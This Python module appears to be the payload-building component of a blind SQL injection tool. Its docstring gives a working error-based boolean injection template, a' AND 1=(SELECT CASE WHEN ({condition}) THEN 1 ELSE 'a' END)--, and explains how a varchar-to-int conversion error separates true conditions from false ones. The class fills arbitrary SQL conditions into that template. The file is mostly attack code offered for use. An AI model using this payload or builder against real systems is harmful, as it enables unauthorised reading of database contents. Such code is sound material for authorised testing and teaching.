"""Payload builder.

Turns a boolean SQL *condition* into the concrete value placed in the injection
parameter, using the configured base payload template. The template carries the
CASE type-confusion structure; the builder only substitutes the condition.

Default template (from the brief):

    a' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)--

When {condition} is TRUE the CASE yields an int (1) and the query succeeds;
when FALSE it yields 'a', forcing a varchar->int conversion error.
"""

from __future__ import annotations


class PayloadBuilder:
    def __init__(self, base_payload: str) -> None:
        if "{condition}" not in base_payload:
            raise ValueError("base_payload must contain the {condition} placeholder")
        self.base_payload = base_payload

    def build(self, condition: str) -> str:
        """Return the injection-parameter value for a given SQL condition."""
        return self.base_payload.replace("{condition}", condition)
